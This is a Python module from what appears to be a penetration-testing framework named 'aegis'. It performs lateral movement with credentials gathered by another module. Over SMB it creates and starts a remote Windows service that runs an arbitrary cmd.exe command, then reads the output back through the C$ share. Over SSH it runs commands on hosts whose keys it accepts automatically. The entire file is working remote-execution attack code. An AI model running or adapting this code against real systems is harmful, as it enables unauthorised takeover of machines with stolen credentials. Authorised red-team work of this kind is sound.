"""Execute commands on remote hosts via WMI, SMB exec, and psexec-style techniques."""

from __future__ import annotations

import time
from typing import List

from aegis.models import AttackResult, Credential, EngagementContext
from aegis.logger import log
from aegis.modules.base import BaseModule

try:
    import impacket  # noqa: F401
    from impacket.dcerpc.v5 import transport
    IMPACKET = True
except ImportError:
    IMPACKET = False

try:
    import paramiko
    PARAMIKO = True
except ImportError:
    PARAMIKO = False


class LateralModule(BaseModule):
    """Execute commands on remote hosts via WMI, SMB exec, and psexec-style techniques."""

    name = "lateral"

    def run(self, ctx: EngagementContext, **kwargs: object) -> List[AttackResult]:
        command: str = str(kwargs.get("command", "whoami"))
        domain: str = str(kwargs.get("domain", ""))

        results: List[AttackResult] = []
        if not ctx.credentials:
            log("[Lateral] No credentials available — run cred module first", "WARN")
            return [AttackResult("lateral", "exec", "PARTIAL",
                                 notes="Need credentials from cred module first")]

        for cred in ctx.credentials:
            if cred.service in ("SMB", "SSH"):
                results.extend(self._exec_smb(ctx, cred, command, domain))
                results.extend(self._exec_ssh(ctx, cred, command))
        return results

    # ------------------------------------------------------------------
    # SMB exec (PSExec-style)
    # ------------------------------------------------------------------

    def _exec_smb(self, ctx: EngagementContext, cred: Credential,
                  command: str, domain: str) -> List[AttackResult]:
        if not IMPACKET:
            return []
        results: List[AttackResult] = []
        try:
            from impacket.dcerpc.v5 import scmr
            from impacket.smbconnection import SMBConnection
            from impacket.dcerpc.v5.transport import DCERPCTransportFactory

            conn = SMBConnection(cred.host, cred.host, timeout=int(ctx.timeout))
            conn.login(cred.username, cred.password, domain)

            # PSExec-style: create remote service
            service_name = f"nr-{cred.host.replace('.', '')[:8]}"
            rpctransport = transport.SMBTransport(cred.host, cred.port or 445,
                                                  filename=r"\svcctl",
                                                  smb_connection=conn)
            dce = rpctransport.get_dce_rpc()
            dce.connect()
            dce.bind(scmr.MSRPC_UUID_SCMR)

            hScManager = scmr.hROpenSCManagerW(dce)["lpScHandle"]
            output_file = f"\\Windows\\Temp\\{service_name}.txt"
            cmd_line = f"cmd.exe /c {command} > {output_file} 2>&1"
            try:
                hService = scmr.hRCreateServiceW(
                    dce, hScManager, service_name, service_name,
                    lpBinaryPathName=cmd_line
                )["lpServiceHandle"]
                scmr.hRStartServiceW(dce, hService)
                time.sleep(2)
                scmr.hRDeleteService(dce, hService)
                scmr.hRCloseServiceHandle(dce, hService)
            except Exception:
                pass

            # Read output
            try:
                output = conn.getFile("C$", output_file.replace("\\Windows\\Temp\\", "Windows\\Temp\\"),
                                      lambda data: data)
                log(f"[Lateral/SMB] Command output on {cred.host}: {output[:100]}", "CRIT")
                results.append(AttackResult(
                    "lateral", "smb_exec", "SUCCESS",
                    host=cred.host, severity="CRITICAL",
                    data={"command": command, "output": output[:500]},
                    notes=f"Remote command execution via SMB on {cred.host} as {cred.username}",
                ))
            except Exception:
                results.append(AttackResult(
                    "lateral", "smb_exec", "PARTIAL",
                    host=cred.host,
                    notes=f"Command executed but output file not readable from {output_file}",
                ))
            dce.disconnect()
            conn.close()
        except Exception as exc:
            results.append(AttackResult("lateral", "smb_exec", "FAILED",
                                        host=cred.host, notes=str(exc)))
        return results

    # ------------------------------------------------------------------
    # SSH exec
    # ------------------------------------------------------------------

    def _exec_ssh(self, ctx: EngagementContext, cred: Credential,
                  command: str) -> List[AttackResult]:
        if not PARAMIKO or cred.service != "SSH":
            return []
        results: List[AttackResult] = []
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(cred.host, port=cred.port or 22,
                           username=cred.username, password=cred.password,
                           timeout=ctx.timeout)
            stdin, stdout, stderr = client.exec_command(command, timeout=ctx.timeout)
            output = stdout.read().decode("utf-8", errors="replace")
            err = stderr.read().decode("utf-8", errors="replace")
            log(f"[Lateral/SSH] {cred.host}: {output[:80]}", "CRIT")
            results.append(AttackResult(
                "lateral", "ssh_exec", "SUCCESS",
                host=cred.host, severity="CRITICAL",
                data={"command": command, "stdout": output[:500], "stderr": err[:100]},
                notes=f"SSH command execution on {cred.host} as {cred.username}",
            ))
            client.close()
        except Exception as exc:
            results.append(AttackResult("lateral", "ssh_exec", "FAILED",
                                        host=cred.host, notes=str(exc)))
        return results
